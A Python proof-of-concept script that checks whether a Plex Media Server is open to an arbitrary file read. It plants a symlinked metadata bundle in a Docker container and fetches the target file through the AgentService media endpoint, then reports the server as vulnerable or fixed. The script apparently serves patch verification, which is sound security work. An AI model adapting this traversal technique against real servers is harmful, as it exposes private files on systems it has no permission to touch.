#!/usr/bin/env python3
import argparse
import hashlib
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request


class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def docker(container, *args, input_data=None, stdout=None):
    return subprocess.run(
        ["docker", "exec", "-i", container, *args],
        input=input_data,
        stdout=stdout,
        stderr=subprocess.PIPE,
        check=True,
    )


def remove_bundle(container, bundle):
    result = subprocess.run(
        ["docker", "exec", container, "find", bundle, "-depth", "-delete"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=False,
    )
    return result.returncode == 0


def main():
    parser = argparse.ArgumentParser(
        description="Verify Plex AgentService metadata symlink file-read behavior"
    )
    parser.add_argument("--url", required=True, help="Plex server origin")
    parser.add_argument("--token", required=True, help="Local-administrator token")
    parser.add_argument("--container", required=True, help="Disposable Docker container")
    parser.add_argument("--target", default="/etc/hostname")
    parser.add_argument("--expect", choices=("vulnerable", "fixed"), required=True)
    args = parser.parse_args()

    origin = args.url.rstrip("/")
    parsed = urllib.parse.urlsplit(origin)
    if (parsed.scheme not in ("http", "https") or not parsed.netloc or
            parsed.path or parsed.query or parsed.fragment):
        parser.error("--url must be an HTTP(S) origin without a path")
    if not args.target.startswith("/"):
        parser.error("--target must be an absolute container path")

    stamp = int(time.time() * 1000)
    guid = f"local://zenofex-agentservice-{stamp}"
    digest = hashlib.sha1(guid.encode("utf-8")).hexdigest()
    bundle = (
        "/config/Library/Application Support/Plex Media Server/Metadata/Movies/"
        f"{digest[0]}/{digest[1:]}.bundle"
    )
    combined = f"{bundle}/Contents/_combined"
    posters = f"{combined}/posters"
    info = f"{combined}/Info.xml"
    symlink = f"{posters}/outside"
    control_path = f"{posters}/control"
    control_data = f"agentservice-control-{stamp}\n".encode("ascii")
    control_xml = b'<Movie><posters><item media="control"/></posters></Movie>\n'
    outside_xml = b'<Movie><posters><item media="outside"/></posters></Movie>\n'

    def fetch_media(name):
        query = urllib.parse.urlencode(
            {"mediaType": "1", "guid": guid,
             "url": f"metadata://posters/{name}"}
        )
        request = urllib.request.Request(
            f"{origin}/system/agents/media/get?{query}",
            headers={"X-Plex-Token": args.token},
        )
        opener = urllib.request.build_opener(NoRedirectHandler)
        try:
            with opener.open(request, timeout=15) as response:
                return response.status, response.read()
        except urllib.error.HTTPError as exc:
            return exc.code, exc.read()

    remove_bundle(args.container, bundle)
    try:
        docker(args.container, "mkdir", "-p", posters)
        docker(
            args.container,
            "tee",
            info,
            input_data=control_xml,
            stdout=subprocess.DEVNULL,
        )
        docker(
            args.container, "tee", control_path,
            input_data=control_data, stdout=subprocess.DEVNULL,
        )
        docker(args.container, "chown", "-R", "plex:plex", bundle)
        expected = docker(
            args.container,
            "cat",
            args.target,
            stdout=subprocess.PIPE,
        ).stdout

        control_status, control_body = fetch_media("control")
        if control_status != 200 or control_body != control_data:
            raise RuntimeError(
                f"in-bundle control request failed with HTTP {control_status}"
            )
        print("Control: HTTP 200 with exact in-bundle bytes")
        docker(
            args.container, "tee", info,
            input_data=outside_xml, stdout=subprocess.DEVNULL,
        )
        docker(args.container, "ln", "-s", args.target, symlink)
        docker(args.container, "chown", "-R", "plex:plex", bundle)
        status, body = fetch_media("outside")

        print(f"HTTP {status}")
        print(f"Response bytes: {len(body)}")
        if args.expect == "vulnerable":
            if status != 200 or body != expected:
                raise RuntimeError("target file was not returned")
        elif status != 404 or body == expected:
            raise RuntimeError(f"expected HTTP 404 containment rejection, got {status}")
        if args.expect == "vulnerable":
            print("PASS: target file bytes returned through the bundle symlink")
        else:
            print("PASS: bundle symlink request rejected with HTTP 404")
    finally:
        if not remove_bundle(args.container, bundle):
            raise RuntimeError(f"temporary bundle cleanup failed: {bundle}")


if __name__ == "__main__":
    try:
        main()
    except (OSError, RuntimeError, subprocess.SubprocessError) as exc:
        print(f"error: {exc}", file=sys.stderr)
        raise SystemExit(1)
